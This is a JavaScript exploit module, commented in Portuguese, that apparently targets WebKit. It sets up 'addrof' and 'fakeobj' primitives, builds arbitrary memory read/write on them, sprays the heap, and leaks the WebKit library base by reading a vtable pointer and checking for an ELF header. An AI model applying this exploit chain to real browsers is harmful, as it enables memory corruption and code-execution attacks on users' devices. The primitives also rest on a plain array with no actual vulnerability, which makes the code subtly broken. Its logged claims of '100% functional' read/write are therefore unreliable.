// js/script3/testArrayBufferVictimCrash.mjs (v109 - Vazamento da Base do WebKit)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Adicionada uma nova função de teste que, após a verificação de L/E, usa as
// primitivas estáveis para vazar o endereço base da biblioteca WebKit.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Final_v109_WebKitLeak";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// NOVA FUNÇÃO DE TESTE: VAZAMENTO DA BASE DO WEBKIT
// =======================================================================================
async function runWebKitBaseLeakTest(addrof, arb_read) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        // 1. Obter um objeto WebKit conhecido.
        const location_obj = document.location;
        logS3(`Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);

        // 2. Usar 'addrof' para obter o endereço do objeto JS, que é um ponteiro para a estrutura C++.
        const location_addr = addrof(location_obj);
        logS3(`Endereço do objeto JSLocation: ${location_addr.toString(true)}`, "leak", FNAME_LEAK_TEST);

        // 3. Ler o primeiro campo (8 bytes) do objeto. Este deve ser o ponteiro da vtable.
        const vtable_ptr = arb_read(location_addr);
        logS3(`Ponteiro da Vtable vazado: ${vtable_ptr.toString(true)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. Não é possível continuar.");
        }

        // 4. Calcular o endereço base alinhando o ponteiro da vtable para baixo.
        // Um alinhamento de 0x4000 é comum. Usaremos uma máscara para zerar os bits inferiores.
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not(); // Máscara para alinhar em 0x4000
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`Candidato a endereço base do WebKit (alinhado): ${webkit_base_candidate.toString(true)}`, "leak", FNAME_LEAK_TEST);

        // 5. Verificação: Ler os primeiros 4 bytes do endereço base candidato e checar a assinatura "ELF".
        const elf_magic_full = arb_read(webkit_base_candidate);
        const elf_magic_low = elf_magic_full.low();
        
        logS3(`Assinatura lida do endereço base: 0x${elf_magic_low.toString(16)}`, "leak", FNAME_LEAK_TEST);
        if (elf_magic_low === 0x464C457F) { // 0x7F + 'E' + 'L' + 'F'
            logS3(`SUCESSO DE VAZAMENTO! Assinatura ELF encontrada. A base do WebKit é muito provavelmente ${webkit_base_candidate.toString(true)}`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error("Assinatura ELF não encontrada. O endereço base vazado pode estar incorreto.");
        }

    } catch(e) {
        logS3(`Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (ATUALIZADA PARA CHAMAR O TESTE DE VAZAMENTO)
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou.", webkit_base: null };

    try {
        logS3("--- FASE 1/2: Configurando primitivas 'addrof' e 'fakeobj' com NaN Boxing... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => {
            vulnerable_slot[0] = obj;
            let value_as_double = vulnerable_slot[0];
            let value_as_int64 = doubleToInt64(value_as_double);
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };
        const fakeobj = (addr) => {
            const boxed_addr = new AdvancedInt64(addr).add(NAN_BOXING_OFFSET);
            const value_as_double = int64ToDouble(boxed_addr);
            vulnerable_slot[0] = value_as_double;
            return vulnerable_slot[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' robustas estão operacionais.", "good");
       
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) { spray.push({ a: 1.1, b: 2.2 }); }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        
        arb_write_final(prop_a_addr, value_to_write);
        const value_read = arb_read_final(prop_a_addr);

        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }
        
        logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");

        // --- NOVA ETAPA: CHAMADA PARA O TESTE DE VAZAMENTO DA BASE DO WEBKIT ---
        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read_final);
        
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. L/E 100% funcional. Vazamento da base do WebKit: " + (leak_result.success ? "SUCESSO" : "FALHA"),
            webkit_base: leak_result.webkit_base
        };

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
